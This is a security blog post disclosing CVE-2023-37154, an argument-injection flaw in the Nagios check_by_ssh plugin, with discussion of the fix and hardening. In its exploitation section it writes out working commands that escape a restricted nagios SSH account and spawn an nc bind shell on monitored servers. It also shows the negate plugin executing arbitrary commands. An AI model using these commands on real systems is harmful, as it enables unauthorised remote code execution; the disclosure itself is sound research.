<!doctype html>
<html>
  <head>
  <title>
    
      Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154 | Joshua.Hu | Joshua Rogers' Scribbles
    
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8">
  <link rel="stylesheet" href="https://joshua.hu/assets/css/main.css">
  <link rel="stylesheet" href="https://joshua.hu/assets/css/syntax.css">
  <!-- Use Atom -->
  <link type="application/atom+xml" rel="alternate" href="https://joshua.hu/feed.xml" title="Joshua.Hu | Joshua Rogers&apos; Scribbles" />
  <!-- Use RSS-2.0 -->
  <!--<link href="https://joshua.hu/rss-feed.xml" type="application/rss+xml" rel="alternate" title="Joshua.Hu | Joshua Rogers' Scribbles | "/>
  //-->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Quattrocento+Sans">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<!--  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
    MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        }
      });
  </script>
-->
  <!-- Google Analytics -->
  <!-- <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', '', 'auto');
  ga('send', 'pageview');
</script>
 -->
  <!-- Use Jekyll SEO plugin -->
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154 | Joshua.Hu Joshua Rogers’ Scribbles</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154" />
<meta name="author" content="Joshua Rogers" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Nagios-compatible systems are some of the most widely used infrastructure monitoring solutions. They use “plugins” to monitor server performance, with “Nagios Core” interpreting results. However, there’s a potentially significant security issue with Nagios and its default plugins – they may be an effective backdoor to the monitored servers. Even with sysadmin restrictions on the user, it’s possible to bypass these restrictions and achieve remote code execution." />
<meta property="og:description" content="Nagios-compatible systems are some of the most widely used infrastructure monitoring solutions. They use “plugins” to monitor server performance, with “Nagios Core” interpreting results. However, there’s a potentially significant security issue with Nagios and its default plugins – they may be an effective backdoor to the monitored servers. Even with sysadmin restrictions on the user, it’s possible to bypass these restrictions and achieve remote code execution." />
<link rel="canonical" href="https://joshua.hu/nagios-hacking-cve-2023-37154" />
<meta property="og:url" content="https://joshua.hu/nagios-hacking-cve-2023-37154" />
<meta property="og:site_name" content="Joshua.Hu Joshua Rogers’ Scribbles" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-09-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Joshua Rogers"},"dateModified":"2023-09-05T00:00:00+00:00","datePublished":"2023-09-05T00:00:00+00:00","description":"Nagios-compatible systems are some of the most widely used infrastructure monitoring solutions. They use “plugins” to monitor server performance, with “Nagios Core” interpreting results. However, there’s a potentially significant security issue with Nagios and its default plugins – they may be an effective backdoor to the monitored servers. Even with sysadmin restrictions on the user, it’s possible to bypass these restrictions and achieve remote code execution.","headline":"Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154","mainEntityOfPage":{"@type":"WebPage","@id":"https://joshua.hu/nagios-hacking-cve-2023-37154"},"url":"https://joshua.hu/nagios-hacking-cve-2023-37154"}</script>
<!-- End Jekyll SEO tag -->

</head>

  <body>
    <div class="container">
      <header class="header">
  <h3 class="header-title">
    <a href="https://joshua.hu/">Joshua.Hu | Joshua Rogers' Scribbles</a>
    <small class="header-subtitle"></small>
    <div class="menu">
  <nav class="menu-content">
    
      <a href="https://joshua.hu/about.html">About Me</a>
    
      <a href="https://joshua.hu/projects.html">Projects</a>
    
      <a href="https://joshua.hu/ideas.html">Ideas</a>
    
      <a href="https://joshua.hu/files/joshua-rogers-security-engineer.pdf">Curriculum Vitae</a>
    
      <a href="https://joshua.hu/contact.html">Contact</a>
    
  </nav>
  <nav class="social-icons">
    
  
  
    <a href="https://github.com/MegaManSec" target="_blank"><i class="fa-brands fa-github" aria-hidden="true"></i></a>
  

  
  
    <a href="https://x.com/MegaManSec" target="_blank"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
  

  
  
    <a href="https://www.linkedin.com/in/joshua-alexander-rogers/" target="_blank"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>
  

  
  
    <a href="https://news.ycombinator.com/user?id=mmsc" target="_blank"><i class="fa-brands fa-hackernews" aria-hidden="true"></i></a>
  

  
  
    <a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
  

  </nav>
</div>

  </h3>
</header>

      <div class="content-container">
        


  <div class="before-sidebar">
    <div class="sidebar">
      <input type="checkbox" id="toggle-toc" style="display:none;">
      <div class="actions">
        <ul class="icon-list">
          <li class="up-arrow">
            <a href="#" class="tooltip">
              <i class="fas fa-chevron-up fa-lg" style="line-height:initial;"></i>
              <span class="tooltiptext">Back To Top</span>
            </a>
          </li>
          <li class="sidebar-spacer" style="margin: 0 50px;"></li>
          <li class="bars">
            <label for="toggle-toc" class="tooltip-left">
              <i class="fas fa-bars fa-lg" style="line-height:initial;"></i>
              <span class="tooltiptext-left">Hide ToC</span>
              <span class="tooltiptext-left-checked">Show ToC</span>
            </label>
          </li>
        </ul>
      </div>
      <span class="conditional-toc">
        
  <ul><li><a href="#nagios-a-quick-history">Nagios: A Quick History.</a></li><li><a href="#nagios-plugins">Nagios Plugins</a></li><li><a href="#nagios-connection-methods">Nagios Connection Methods</a></li><li><a href="#nagios-backdoor-user">Nagios Backdoor User</a></li><li><a href="#nagios-plugin-hacking">Nagios Plugin Hacking</a></li><li><a href="#discussion-and-fix">Discussion and Fix</a></li><li><a href="#conclusion">Conclusion</a></li></ul>

      </span>
    </div>
  </div>


<h1 class="post-title">
  Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154
</h1>

<article>
  <p>Nagios-compatible systems are some of the most widely used infrastructure monitoring solutions. They use “plugins” to monitor server performance, with “Nagios Core” interpreting results. However, there’s a potentially significant security issue with Nagios and its default plugins – they may be an effective backdoor to the monitored servers. Even with sysadmin restrictions on the user, it’s possible to bypass these restrictions and achieve remote code execution.</p>

<p>In this blog post, we’ll explore how Nagios can be used to execute arbitrary commands on servers with <a href="https://github.com/nagios-plugins/nagios-plugins">nagios-plugins</a> or <a href="https://github.com/monitoring-plugins/monitoring-plugins">monitoring-plugins/monitoring-plugins</a> installed, and how argument injection vulnerabilities can be abused to bypass restrictions on the nagios user’s SSH access.</p><hr />
<h3 id="nagios-a-quick-history">
  
  
    Nagios: A Quick History. <a href="#nagios-a-quick-history">###</a>
  
  
</h3>
    

<p>“Nagios” was originally created in 1999, and is one of the world’s most popular infrastructure monitoring solutions. Effectively, Nagios has two parts: its core system, and its plugin system. The core system connects remotely to the server it is monitoring, runs a “plugin”, and then handles the response.</p>

<p>Nagios Core has under-gone various forks and clones in history, forming the basis for Naemon and Icinga, as well as op5, Shinken. Various projects have been created in peripheral to Nagios, such as Thruk and Nagios XI, which are web interfaces for the aforementioned core systems.</p><hr />
<h3 id="nagios-plugins">
  
  
    Nagios Plugins <a href="#nagios-plugins">###</a>
  
  
</h3>
    

<p>Nagios Plugins are small programs or scripts that perform the checks or tests on the host. These plugins can do practically anything: check connectivity to networks or services, check system statistics, perform tests on local or remote services, and so on. They are completely modular, so you can add plugins to monitor specific services for your environment easily: they simply must return an exit status code and some text that can be parsed by Nagios Core.</p><hr />
<h3 id="nagios-connection-methods">
  
  
    Nagios Connection Methods <a href="#nagios-connection-methods">###</a>
  
  
</h3>
    

<p>Again, it is important to note that the monitoring data is nearly always collected via a <em>pull</em> method – Nagios Core connects to the server being monitored, plugins are run, and data is collected. The connection is generally either using SSH, or NRPE (Nagios Remote Plugin Executor); the former using either SSH keys or credentials, and the latter of which <em>can</em> be authenticated using a pre-defined SSL certificate.</p>

<p>The Nagios official documentation states that <a href="https://assets.nagios.com/downloads/nagioscore/docs/nrpe/NRPE.pdf">SSH is more secure than NRPE</a>. But is that completely true?</p><hr />
<h3 id="nagios-backdoor-user">
  
  
    Nagios Backdoor User <a href="#nagios-backdoor-user">###</a>
  
  
</h3>
    

<p>When you set up nagios-plugins on the <em>monitored</em> host, you normally create a new user for the plugins to run. Just like other human users on the server, this user has access to a shell accessible via SSH.</p>

<p>If Nagios uses SSH to execute the plugins on the server, then, effectively, a backdoor account has been created: if you hack the private key from the Nagios Core server, then you can gain system access to every server being monitored. Seems bad, right?</p>

<p>In reality, people don’t usually allow the Nagios user on their monitored servers unrestricted shell access. Instead, a wrapper script restricts the user to running only installed plugins. For example, a restriction on Nagios’ SSH key in <em>authorized_keys</em>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>command="/var/nagios/wrapper.sh",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa [..ssh pubkey..]
</code></pre></div></div>
<p>could limit the user to running only plugins installed in <em>/usr/lib/nagios/plugins/</em>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh

case "$SSH_ORIGINAL_COMMAND" in
    check_[a-z]*)
        /usr/lib/nagios/plugins/$SSH_ORIGINAL_COMMAND
        ;;
    *)
        exit 1
        ;;
esac
</code></pre></div></div>

<p>This way, the only commands that can be executed via SSH must begin with the name of an installed plugin. At first glance, this is a practical solution to restricting this account to not act as a backdoor for anybody that is able to gain access to the Nagios server.</p><hr />
<h3 id="nagios-plugin-hacking">
  
  
    Nagios Plugin Hacking <a href="#nagios-plugin-hacking">###</a>
  
  
</h3>
    

<p>During a recent pentest, I was in this exact situation: I had hacked the Nagios Core server, and had the private key used to connect via SSH to thousands of servers being monitored via Nagios. However, I couldn’t get a shell. Not straight away, at least.</p>

<p>Looking through the list of default installed plugins by the Debian package, I came across the <em>check_by_ssh</em> plugin, which “uses SSH to execute commands on a remote host”. That is to say, Nagios Core connects to a monitored server, and that monitored server then connects to a further system.</p>

<p><em>check_by_ssh</em> comes with a handy option to pass parameters to the ssh client when it is executed on the monitored server:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     -o, --ssh-option=OPTION
        Call ssh with '-o OPTION' (may be used multiple times) [optional]
</code></pre></div></div>

<p>Coincidently while I was performing this aforementioned pentest, I was also working on a website documenting different ways to achieve command execution using a vulnerability known as argument injection. On that website, I have a list of different ways that the ssh client can be abused to execute commands <em>locally</em>. Documented at <a href="https://gtfoargs.github.io/gtfoargs/ssh/">gtfoargs.github.io/gtfoargs/ssh</a>, I list the well-known <em>ProxyCommand</em>, <em>PermitLocalCommand</em>, and <em>LocalCommand</em> options available in SSH, which will execute commands on the <em>client side</em>.</p>

<p>Effectively, <em>check_by_ssh</em> will call <em>ssh(1)</em>, which will call <em>system(3)</em> with user-supplied data.</p>

<p>Putting this all together, I realized that I could abuse this functionality to execute commands on the monitored system, using this <em>check_by_ssh</em> plugin. Using the following commands, I could execute <em>uname</em>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i nagios.key nagios@server 'check_by_ssh -H remote-server -l passwordlessuser -o PermitLocalCommand=yes -o LocalCommand="uname" -o StrictHostKeyChecking=no'
</code></pre></div></div>

<p>The monitored server would connect to remote-server using the passwordlessuser user successfully, and <em>uname</em> would run on the monitored server itself. Due to either a limitation or bug in <em>check_by_ssh</em>, spaces did not work for the <code class="language-plaintext highlighter-rouge">-o</code> parameter of <em>check_by_ssh</em>.</p>

<p>The solution to this problem was to use <code class="language-plaintext highlighter-rouge">\${IFS}</code> in place of every space needed. As such, I came up with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -i nagios.key nagios@server "check_by_ssh -H remote-server -l passwordlressuser -v -o PermitLocalCommand=yes -o StrictHostKeyChecking=no -o LocalCommand=nc\${IFS}-l\${IFS}-p1337\${IFS}-e/bin/sh"
</code></pre></div></div>
<p>and was able to spawn a shell on port 1337.</p><hr />
<h3 id="discussion-and-fix">
  
  
    Discussion and Fix <a href="#discussion-and-fix">###</a>
  
  
</h3>
    

<p>Different providers of <em>nagios-plugins</em> view this issue differently. The original <a href="http://nagios-plugins.org/">http://nagios-plugins.org/</a> considers this an issue and has fixed it in <a href="https://github.com/nagios-plugins/nagios-plugins/commit/e8810de21be80148562b7e0168b0a62aeedffde6">this commit</a>. <a href="https://github.com/monitoring-plugins/monitoring-plugins">monitoring-plugins</a>, which provides <em>nagios-plugins</em> for Ubuntu and Debian, do not consider this an issue, and they conclude that while the execution of arbitrary commands by <em>check_by_ssh</em> is not well known, there may be legitimate reason to support the functionality afforded by <em>ssh(1)</em>. In the former case, CVE-2023-37154 was assigned to the issue.</p>

<p>There is of course another discussion of how much responsibility lays on the sysadmins monitoring these systems. Other than abusing this functionality in <em>check_by_ssh</em>, the <em>negate</em> plugin can also arbitrarily run commands by design:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ./negate --help
[..]
Negates the status of a plugin (returns OK for CRITICAL and vice-versa).
Additional switches can be used to control which state becomes what.

# ./negate '/bin/uname -a'
Linux security 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux
</code></pre></div></div>

<p>However, even if a sysadmin installs only the plugins they need, there is an unknown factor of whether the plugins may <em>possibly</em> execute arbitrary commands on the host themself.</p>

<p>The aforementioned NRPE (which is now deprecated) recommended using predefined lists of commands which the plugins on the servers would run. In order to parse user-defined arguments, one must specifically configure <code class="language-plaintext highlighter-rouge">dont_blame_nrpe=1</code>. That may be the most secure method for SSH too.</p><hr />
<h3 id="conclusion">
  
  
    Conclusion <a href="#conclusion">###</a>
  
  
</h3>
    

<p>In the world of security, it is the weakest link that an attacker should focus their attention on. Whether it be physical or digital, a server or a service; if an attacker is able to compromise a link that is imperative to the overall chain, then the whole chain falls. Monitoring systems are often neglected in terms of security despite their wide-reaching access. If you can take the Nagios server, you can take over the whole farm.</p>

</article>

  <span class="post-date">
  Published on
  
  September
  5th,
  2023
  by
  
    Joshua Rogers
  
</span>



  <div class="post-date"></div>
<!-- <div class="sharing-icons">
  <a href="https://twitter.com/intent/tweet?text=Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154&amp;url=https://joshua.hu/nagios-hacking-cve-2023-37154" target="_blank"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
  <a href="https://www.facebook.com/sharer/sharer.php?u=https://joshua.hu/nagios-hacking-cve-2023-37154&amp;title=Nagios Plugins: Hacking Monitored Servers with check_by_ssh and Argument Injection: CVE-2023-37154" target="_blank"><i class="fa-brands fa-facebook" aria-hidden="true"></i></a>
</div> -->



  <div class="related">
  <h1 ></h1>
  
  <ul class="related-posts">
    
  </ul>
</div>




      </div>
      <footer class="footer">
  
  
  
    <a href="https://github.com/MegaManSec" target="_blank"><i class="fa-brands fa-github" aria-hidden="true"></i></a>
  

  
  
    <a href="https://x.com/MegaManSec" target="_blank"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
  

  
  
    <a href="https://www.linkedin.com/in/joshua-alexander-rogers/" target="_blank"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>
  

  
  
    <a href="https://news.ycombinator.com/user?id=mmsc" target="_blank"><i class="fa-brands fa-hackernews" aria-hidden="true"></i></a>
  

  
  
    <a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
  

  <div class="footer-description"><a href="https://joshua.hu/">Joshua.Hu | Joshua Rogers' Scribbles |  by Joshua Rogers</a></div>
</footer>

    </div>
  </body>
</html>
